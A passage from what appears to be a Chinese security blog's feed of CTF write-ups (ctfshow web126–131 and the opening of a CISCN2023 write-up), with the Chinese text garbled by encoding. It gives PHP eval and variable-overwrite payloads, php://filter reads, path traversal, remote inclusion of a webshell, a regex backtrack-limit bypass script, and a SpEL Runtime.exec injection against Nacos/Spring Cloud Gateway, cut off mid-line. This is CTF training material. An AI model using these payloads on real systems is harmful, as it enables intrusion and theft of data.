class="number">0</span>]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€webç½‘é¡µæ¨¡å¼ä¸‹</span><br><span class="line"></span><br><span class="line">åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹</span><br><span class="line"></span><br><span class="line">    è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ</span><br><span class="line"></span><br><span class="line">    è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][<span class="number">0</span>] = $_SERVER[â€˜QUERY_STRINGâ€™]</span><br><span class="line"></span><br><span class="line">    $argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨ç½‘é¡µæ¨¡å¼ä¸‹è¿è¡Œçš„ï¼Œæ‰€ä»¥<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>ä¹Ÿå°±æ˜¯<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br>è¿™æ—¶å€™æˆ‘ä»¬åªè¦é€šè¿‡ <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>å°†$flagèµ‹å€¼<code>flag_give_me</code>å°±å¯ä»¥äº†ã€‚<br>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">get:  $fl0g=flag_give_me;</span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%5bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="built_in">eval</span>($a[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éé¢„æœŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)   é¢˜ç›®å‡ºä¸æ¥ï¼Œæœ¬åœ°æµ‹è¯•å¯ä»¥</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">ä¼ å…¥ a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">ç»“æœå¦‚ä¸‹</span><br><span class="line">array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; string(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CLIæ¨¡å¼ä¸‹ç›´æ¥æŠŠ request info â¾¥â¾¯çš„argvå€¼å¤åˆ¶åˆ°arræ•°ç»„ä¸­å»</span><br><span class="line">ç»§ç»­åˆ¤æ–­query stringæ˜¯å¦ä¸ºç©ºï¼Œ</span><br><span class="line">å¦‚æœä¸ä¸ºç©ºæŠŠé€šè¿‡+ç¬¦å·åˆ†å‰²çš„å­—ç¬¦ä¸²è½¬æ¢æˆphpå†…éƒ¨çš„zend_stringï¼Œ</span><br><span class="line">ç„¶åå†æŠŠè¿™ä¸ªzend_stringå¤åˆ¶åˆ° arr æ•°ç»„ä¸­å»ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    die(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è·‘ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹çš„è¿™äº›å­—ç¬¦å¯ä»¥ä»£æ›¿<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  è¿™é‡Œçš„åŠ å·åœ¨urlä¸­èµ·åˆ°ç©ºæ ¼çš„ä½œç”¨</span><br></pre></td></tr></table></figure><p>å‡ºå»è¿‡æ»¤æ‰çš„å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ¼å®ç°<br>payloadï¼š<code>ctf show=ilove36d</code></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™ç§é¢˜éœ€è¦æœ‰fuzzçš„æŠ€æœ¯ï¼Œå¾—å­¦ä¸€ä¸‹è¿™ä¸ªphpå°±è„šæœ¬çš„å†™æ³•ã€‚</p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><h3 id="è€ƒç‚¹ï¼šgettextï¼ˆâ€-â€ï¼‰å‡½æ•°çš„ä½¿ç”¨-æŸ¥çœ‹æ‰€æœ‰å˜é‡get-defined-vars"><a href="#è€ƒç‚¹ï¼šgettextï¼ˆâ€-â€ï¼‰å‡½æ•°çš„ä½¿ç”¨-æŸ¥çœ‹æ‰€æœ‰å˜é‡get-defined-vars" class="headerlink" title="è€ƒç‚¹ï¼šgettextï¼ˆâ€_â€ï¼‰å‡½æ•°çš„ä½¿ç”¨+æŸ¥çœ‹æ‰€æœ‰å˜é‡get_defined_vars"></a>è€ƒç‚¹ï¼šgettextï¼ˆâ€_â€ï¼‰å‡½æ•°çš„ä½¿ç”¨+æŸ¥çœ‹æ‰€æœ‰å˜é‡get_defined_vars</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿ç»­ä¸¤æ¬¡è°ƒç”¨ï¼Œè€Œä¸”ä¼šæ£€æŸ¥f1å‡½æ•°åç§°ï¼Œç‰¹æ®Šå­—ç¬¦çš„å‡½æ•°åªæœ‰<code>_</code>ï¼Œæ‰€å¯¹åº”çš„å‡½æ•°ä¸ºï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274254001-69cdf9cb-1498-4251-9d53-cb854861e579.png" alt="image.png"><br>  <img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274251016-f41af228-5679-445a-967b-315d8677c759.png" alt="image.png"><br>å¯ä»¥å€Ÿç”±è¾“å‡ºå­—ç¬¦ä¸²<br>ä½¿ç”¨<code>f1=_&amp;f2=phpinfo</code>å°±å¯ä»¥æŸ¥çœ‹åˆ°phpä¿¡æ¯<br>ç”±äºé¢˜ç›®æœ‰<code>include(&#39;flag.php&#39;)</code>å¯ä»¥ç›´æ¥è¾“å‡ºæ‰€æœ‰å˜é‡ï¼š<br>payloadï¼š<code>f1=_&amp;f2=get_defined_vars</code>å³å¯</p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="è€ƒç‚¹ï¼šstripos"><a href="#è€ƒç‚¹ï¼šstripos" class="headerlink" title="è€ƒç‚¹ï¼šstripos"></a>è€ƒç‚¹ï¼šstripos</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688276827328-a519e966-3864-4e99-9157-4cbabe21a2f1.png" alt="image.png"></p><h2 id="æ–¹æ³•1-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#æ–¹æ³•1-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–¹æ³•1 è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>æ–¹æ³•1 è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>ä¸€ä¸ªæ–¹æ³•æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åä¿å­˜ä¸ºtxtæ–‡æ¡£ï¼Œç„¶åå¦‚ä¸‹ä½¿ç”¨ï¼š<br><code>f=http://url/xxx.txt?ctfshow</code><br>æµ‹è¯•ä¸€ä¸‹ï¼š<br>åœ¨æ ¹ç›®å½•å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279012856-b10947c0-ec54-4c88-950a-181dcc097ce8.png" alt="image.png"><br>æ³¨æ„ï¼Œä¸€å®šè¦èƒ½è®¿é—®å¾—åˆ°ï¼Œæ”¾åœ¨å¯¹åº”wwwæˆ–è€…wwwrootç›®å½•ä¸‹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279781611-621b25c1-bd8f-42bd-baac-336ec755e9ca.png" alt="6c4d3974c2ebcc5e4389c8ca31c7cac.png"><br>ç„¶åç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š<br>èƒ½å¤Ÿè·å–åˆ°ï¼Œä½†æ˜¯ä¸èƒ½å¤Ÿrce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688280341422-1fa73f65-9741-4958-a762-11660750fdfd.png" alt="image.png"><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p><h2 id="æ–¹æ³•2-ç›´æ¥ä½¿ç”¨ä¼ªåè®®"><a href="#æ–¹æ³•2-ç›´æ¥ä½¿ç”¨ä¼ªåè®®" class="headerlink" title="æ–¹æ³•2 ç›´æ¥ä½¿ç”¨ä¼ªåè®®"></a>æ–¹æ³•2 ç›´æ¥ä½¿ç”¨ä¼ªåè®®</h2><p><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>base64è§£å¯†å³å¯</p><h2 id="æ–¹æ³•3-ç›®å½•ç©¿è¶Š"><a href="#æ–¹æ³•3-ç›®å½•ç©¿è¶Š" class="headerlink" title="æ–¹æ³•3 ç›®å½•ç©¿è¶Š"></a>æ–¹æ³•3 ç›®å½•ç©¿è¶Š</h2><p><code>/ctfshow/../../../../var/www/html/flag.php</code></p><h1 id="web130ã€web131"><a href="#web130ã€web131" class="headerlink" title="web130ã€web131"></a>web130ã€web131</h1><h2 id="è€ƒç‚¹ï¼špregmatchæœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"><a href="#è€ƒç‚¹ï¼špregmatchæœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼špregmatchæœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"></a>è€ƒç‚¹ï¼špregmatchæœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº†ã€‚<br>ç›´æ¥ç”¨pythonè„šæœ¬å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://44ff0304-988a-4fea-b5a4-4dcd7874d335.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688281327546-67e6816e-fcde-44ea-819f-e0d4e513075d.png" alt="image.png"><br>é™¤æ­¤ä¹‹å¤–è¿˜å¯ç›´æ¥ï¼š<code>f=ctfshow</code>åé¢æ¥ä»»æ„å­—ç¬¦å‡å¯<br>æˆ–è€…ä½¿ç”¨ç©ºæ•°ç»„ï¼š<code>f[]=ctfshow</code><br>ä½†æ˜¯131ä¼¼ä¹å°±åªèƒ½ä½¿ç”¨å›æº¯è¶…å‡ºåšäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 wp</title>
      <link href="/2023/05/29/CISCN2023%20wp/"/>
      <url>/2023/05/29/CISCN2023%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ˜é˜Ÿç­”é¢˜æƒ…å†µ"><a href="#æˆ˜é˜Ÿç­”é¢˜æƒ…å†µ" class="headerlink" title="æˆ˜é˜Ÿç­”é¢˜æƒ…å†µ"></a>æˆ˜é˜Ÿç­”é¢˜æƒ…å†µ</h1><h2 id="æ’åï¼š282"><a href="#æ’åï¼š282" class="headerlink" title="æ’åï¼š282"></a>æ’åï¼š282</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368785969-9737117c-25d9-4a53-a14f-96b88afe88c2.png" alt="a6f287c23150ba48b360dcc75e6c0b0.png"></p><h2 id="è§£é¢˜åˆ—è¡¨"><a href="#è§£é¢˜åˆ—è¡¨" class="headerlink" title="è§£é¢˜åˆ—è¡¨"></a>è§£é¢˜åˆ—è¡¨</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li><p>BackendService </p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3></li><li><p>çƒ§çƒ¤æ‘Šå„¿ </p></li><li><p>funcanary </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3></li><li><p>ç­¾åˆ°å¡ </p></li><li><p>pyshell </p></li><li><p>ç½‘ç»œå®‰å…¨äººæ‰å®æˆ˜èƒ½åŠ›è¯„ä»·ç°çŠ¶è°ƒæŸ¥é—®å· </p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3></li><li><p>babyRE </p></li><li><p>ezAndroid </p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3></li><li><p>åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘ </p></li><li><p>Sign_in_passwd </p></li></ul><hr><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>åœ¨nacosæƒé™ç»•è¿‡æ¼æ´ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªpayload<br>nacosæŠ“åŒ…ï¼Œä¿®æ”¹è¿”å›åŒ…ä¸­å‚æ•°ï¼Œç™»å½•<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685266452751-28fda1ed-0ad2-4eee-af5b-1ddf328b434c.png" alt="image.png"><br><a href="https://xz.aliyun.com/t/11493#toc-5">https://xz.aliyun.com/t/11493#toc-5</a><br>å¯¹æºç è¿›è¡Œå®¡è®¡å‘ç°springcloud3.05 spelæ³¨å…¥æ¼æ´ï¼Œåœ¨æ–°å»ºé…ç½®æ–‡ä»¶ï¼Œåä¸ºbackcfg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;spring&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;cloud&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;gateway&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;routes&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;exam&quot;</span>,</span><br><span class="line">            <span class="string">&quot;order&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;lb:/rvice-provider&quot;</span>,</span><br><span class="line">            <span class="string">&quot;predicates&quot;</span>: [</span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;filters&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;args&quot;</span>: &#123;</span><br><span class="line">                  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;result&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new 